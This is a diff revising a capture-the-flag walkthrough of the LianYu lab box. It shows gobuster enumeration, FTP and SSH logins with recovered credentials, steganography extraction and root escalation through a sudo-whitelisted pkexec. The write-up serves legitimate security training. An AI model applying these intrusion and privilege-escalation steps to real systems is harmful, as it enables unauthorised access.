@@ -43,31 +43,75 @@ PORT      STATE SERVICE VERSION
 |   100024  1          51310/udp6  status
 |_  100024  1          56131/udp   status
 ```
-We can see that FTP, SSH and HTTP ports are open.
-I tried anonymous FTP first, but it was rejected. Moved to the web on port 80.
+FTP, SSH, and HTTP ports were open. I tried anonymous FTP first, but it was rejected, then moved to the web on port 80.
 
 ---
 
 ## Web enumeration
 
+2. #### What is the Web Directory you found?
+
 ![homepage](./homepage.png)
 
-The homepage is a static Arrowverse-themed page.
-Went straight to that path in the browser and it worked. Then ran gobuster scoped to it:
+
+The homepage is a static Arrowverse-themed page. It didn't reveal anything useful, so I moved on to gobuster to look for hidden directories.
 
 ```
-gobuster dir -u http://cats.thm/<dir> -w /usr/share/wordlists/dirb/common.txt -t 50
+gobuster dir -u http://yu.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+This gave me:
+```
+/island (Status: 301)
 ```
 
-This gave me a second-level directory. I repeated the same approach — read the page, look for hints, gobuster the result — for the next layer.
+This gave me a second-level directory. I repeated the same approach — visited the page in the browser:
 
-At one point gobuster with `common.txt` found nothing. I checked the source of the current page for clues about file extensions and added `-x` with thematic extensions:
+![island](./island.png)
+
+I inspected the page source for hidden information and found a value, `vigilante`, which I kept for later.
+
+![vigilante](./vigilante.png) 
+
+Ran gobuster again, scoped to `/island`, to check for more hidden files or directories:
 
 ```
-gobuster dir -u http://cats.thm/<deep_path> -w /usr/share/wordlists/dirb/common.txt -x <ext> -t 50
+gobuster dir -u http://yu.thm/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+That gave me:
+```
+/**** (Status: 301)
+```
+— the answer to question 2.
+
+3. #### What is the file name you found?
+
+I then navigated to http://yu.thm/island/**** and inspected the source code:
+
+![ticket](./ticket.png)
+
+This hinted that I should search for files with a `.ticket` extension using gobuster:
+
+```
+gobuster dir -u http://yu.thm/island/**** -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
+```
+This gave me:
+```
+/*****_*****.ticket (Status: 200)
 ```
 
-That found a file containing an encoded string. It didn't decode as base64. Pasted it into CyberChef and used the *Magic* operation, which detected base58. Decoded output gave me a username and password.
+That gave me the path to the ticket file — the answer to this question too.
+
+4. #### What is the FTP Password?
+
+Contents of the file:
+
+````
+This is just a token to get into Queen's Gambit(Ship)
+
+RTy8yhBQdscX
+````
+
+The file contained an encoded string. It didn't decode as base64, so I pasted it into [CyberChef](https://gchq.github.io/CyberChef/) and used the *Magic* operation, which detected base58. The decoded output gave me a username and password.
 
 > **Note to self:** when base64 fails, try base58 / base32 / base62 before assuming the data is encrypted. CyberChef's Magic mode saves a lot of time here.
 
@@ -75,142 +119,120 @@ That found a file containing an encoded string. It didn't decode as base64. Past
 
 ## FTP foothold
 
-Logged into FTP with the credentials from the web:
+5. #### What is the file name with SSH password?
+
+With the value `vigilante` and the FTP password from the last question, I had credentials to log into FTP:
 
 ```
-ftp cats.thm
+ftp yu.thm
+```
+```
+ftp> ls
+-rw-r--r--    1 0        0          511720 June 25 14:26 Leave_me_alone.png
+-rw-r--r--    1 0        0          549924 June 25 14:10 Queen's_Gambit.png
+-rw-r--r--    1 0        0          191026 June 25 14:25 aa.jpg
+ftp> cd ..
+ftp> ls
+drwx------    2 1000     1000         4096 June 25 14:55 slade
+drwxr-xr-x    2 1001     1001         4096 June 25 14:10 vigilante
 ```
 
-Directory listing:
+Logged in as `vigilante`, the home directory had 3 images worth downloading and checking for hidden data. There was no `user.txt` here, which told me `vigilante` wasn't the final target — so I checked `/home` and found another user on the box: `slade` — the account I'd target next.
 
 ```
--rw-------    1 1001  1001      44 .bash_history
--rw-r--r--    1 1001  1001     220 .bash_logout
--rw-r--r--    1 1001  1001    3515 .bashrc
--rw-r--r--    1 0     0       2483 .other_user
--rw-r--r--    1 1001  1001     675 .profile
--rw-r--r--    1 0     0     511720 Leave_me_alone.png
--rw-r--r--    1 0     0     549924 Queen's_Gambit.png
--rw-r--r--    1 0     0     191026 aa.jpg
+ftp> mget *
+mget Leave_me_alone.png? y
+mget Queen's_Gambit.png? y
+mget aa.jpg? y
+ftp> exit
 ```
 
-What caught my attention: the three image files and `.other_user` are owned by **root (UID 0)**, while the normal dotfiles are owned by UID 1001. That's the signal those files were dropped there on purpose.
+With all three images downloaded, I triaged them for steganography.
 
-Switched to binary mode and downloaded everything:
-
-```
-ftp> binary
-ftp> get .other_user
-ftp> get aa.jpg
-ftp> get Leave_me_alone.png
-ftp> get Queen's_Gambit.png queens_gambit.png
-ftp> bye
-```
-
-`.other_user` turned out to be a long DC character biography pasted twice. The character's name (lowercased, no spaces) is the second user on the box. I confirmed this later when SSH accepted that username.
-
----
-
-## Steganography
-
-Three image files, so I triaged each one:
+`aa.jpg` and `Queen's_Gambit.png` opened fine, but `Leave_me_alone.png` wouldn't open and `binwalk -e` turned up nothing. Next I checked the actual file type with `file`:
 
 ```
-file aa.jpg Leave_me_alone.png queens_gambit.png
-exiftool *.png *.jpg
-binwalk *.png *.jpg
+file Leave_me_alone.png
+Leave_me_alone.png: data
 ```
 
-### The broken PNG
-
-`Leave_me_alone.png` wouldn't open. `file` reported it as `data`, not PNG. Hex dump showed why:
+Still no useful type information, so I went straight to the magic bytes with `xxd`:
 
 ```
-00000000: 5845 6fae 0a0d 1a0a ...
+xxd Leave_me_alone.png | head -1
+00000000: 5845 6fae 0a0d 1a0a 0000 000d 4948 4452  XEo.........IHDR
 ```
 
-A valid PNG starts with `89 50 4E 47 0D 0A 1A 0A`. The first four bytes were replaced with `XEo.` and bytes 4–5 were swapped. The rest of the file (`IHDR` and beyond) was untouched, so it was just the magic bytes I needed to fix.
-
-I used Python:
-
-```python
-data = open('Leave_me_alone.png','rb').read()
-fixed = b'\x89PNG\r\n\x1a\n' + data[8:]
-open('leave_fixed.png','wb').write(fixed)
-```
-
-`dd` would have worked too:
+`5845 6fae 0a0d 1a0a` isn't a real magic number for any format I recognized, which told me it had been deliberately corrupted rather than encrypted. I compared it against the header of the other PNG I'd downloaded:
 
 ```
-printf '\x89PNG\r\n\x1a\n' | dd of=Leave_me_alone.png bs=1 count=8 conv=notrunc
+xxd Queen\'s_Gambit.png | head -1
+00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
 ```
 
-After repair, `file` confirmed it as a PNG and it opened normally. The image itself was a hint, not a container — no payload to extract.
+`8950 4e47 0d0a 1a0a` is the correct PNG signature, so I patched it into `Leave_me_alone.png` with `hexeditor`.
 
-### steghide on the JPEG
+![hexedit](./hexedit.png)
 
-`aa.jpg` was the one with an actual payload:
+With the header fixed, the image opened and revealed another password — but no obvious target for it yet. Since `aa.jpg` was the one JPEG and a likely steganography candidate, I tried the password there:
 
 ```
 steghide extract -sf aa.jpg
+Enter passphrase: 
+wrote extracted data to "ss.zip".
 ```
 
-I tried a few thematic passphrases before one worked. The extracted file contained a password for the second user.
-
-If guessing had failed I would have run:
+That extracted a zip, which I unzipped:
 
 ```
-stegseek aa.jpg /usr/share/wordlists/rockyou.txt
+unzip ss.zip
+Archive:  ss.zip
+  inflating: passwd.txt              
+  inflating: *****  
 ```
 
-`stegseek` is much faster than `stegcracker`.
+The second file held the password for the other user on the box — its filename was also the answer to question 5.
 
----
+6. #### user.txt
 
-## SSH foothold
+Used that password to SSH in as `slade`:
 
 ```
-ssh <user>@cats.thm
+ssh slade@yu.thm
 ```
 
-Password from the steg extraction worked. User flag is in the home directory.
+```
+cat user.txt
+******************************
+			--Felicity Smoak
+```
 
 ---
 
 ## Privilege escalation
 
-First thing after getting a shell — check sudo permissions:
+7. #### root.txt
+
+First step for privesc, as always: check what I can run as root.
 
 ```
 sudo -l
 ```
-
-Output:
-
 ```
-User <user> may run the following commands on LianYu:
+User slade may run the following commands on LianYu:
     (root) PASSWD: /usr/bin/pkexec
 ```
 
-What this means:
-
-- `(root)` — runs as root.
-- `PASSWD:` — needs my password (I have it).
-- `/usr/bin/pkexec` — the only binary allowed.
-
-I didn't recognize `pkexec` at first, so I looked it up. It's part of PolicyKit and exists specifically to **execute other programs** as another user. Whitelisting it through sudo means I can ask it to run a shell as root.
-
-[GTFOBins](https://gtfobins.github.io/gtfobins/pkexec/) confirmed this pattern.
+`pkexec` is whitelisted, so I checked [GTFOBins](https://gtfobins.github.io/) for the exploitation pattern:
 
 ```
-sudo /usr/bin/pkexec /bin/bash
-# password
-# id → uid=0(root)
+sudo pkexec /bin/sh
+# whoami
+root
+# cat root.txt
 ```
 
-Root flag is in `/root/`.
-
-> CVE-2021-4034 (PwnKit) also affects this version of `pkexec`, but the box was made before that CVE was disclosed, and the sudo misconfig was clearly the intended path. I mention it for completeness.
+Root flag is in `/root/` — room complete.
 
 ---
 
@@ -223,8 +245,6 @@ Root flag is in `/root/`.
 **Knowing file signatures pays off.** I now have PNG, JPEG, ZIP, ELF, and PE magic bytes memorized. Spotting a broken header in a hex dump beats running every forensic tool on the file.
 
 **Sudo with one binary isn't automatically safe.** It depends on what that binary can do. `pkexec`, `vim`, `find`, `awk`, `less`, `python`, `tar`, `man` — all of them can spawn a shell if sudo lets you run them. Before whitelisting anything, check GTFOBins first.
-
-**`stegseek` over `stegcracker`.** Much faster, same job.
 
 ---
 
